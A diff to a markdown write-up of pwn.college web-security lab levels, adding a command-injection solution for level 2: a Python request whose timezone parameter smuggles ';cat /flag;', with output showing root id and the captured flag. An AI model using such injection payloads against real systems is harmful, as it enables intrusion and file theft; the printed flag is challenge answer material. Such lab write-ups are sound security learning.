@@ -72,6 +72,7 @@ hacker@web-security-level-1:~$
 ## Web-security level 2
 
 * In this challange we have to get the flag via Command injection...
+* This challange is bit tricky...
 
 ```sh
 # for a normal curl request it shows like shoem kind of timezone...
@@ -85,9 +86,29 @@ hacker@web-security-level-2:~$ curl http://challenge.localhost:80?timezone=whoam
 Tue Apr 25 09:28:55 whoami 2023
 
 # After emum ... 
+# After curl i tried with the Python Request module..
+```
+> The flag Request which we are using...
 
+```py
+url = "http://challenge.localhost:80?timezone=who;cat /flag;"
+data = {"Cookie": "c61b7eb3605bc2a2fdbbcac920bdd414"}
+response = re.post(url , data=data )
+print(response.text)
+```
+> Response
+```sh
+hacker@web-security-level-2:~$ python3 web-security/file.py 
+uid=0(root) gid=1000(hacker) groups=1000(hacker)
+Sat Apr 29 07:53:33 UTC 2023
+
+hacker@web-security-level-2:~$ python3 web-security/file.py 
+pwn.college{MyTKOEkbBTp0TjGsI6YLcxTh7W2.0FO4MzMsEDM3czW}
+Sat Apr 29 07:54:22 UTC 2023
 
 ```
+
+
 ## Web-security level 3
 ```sh
 
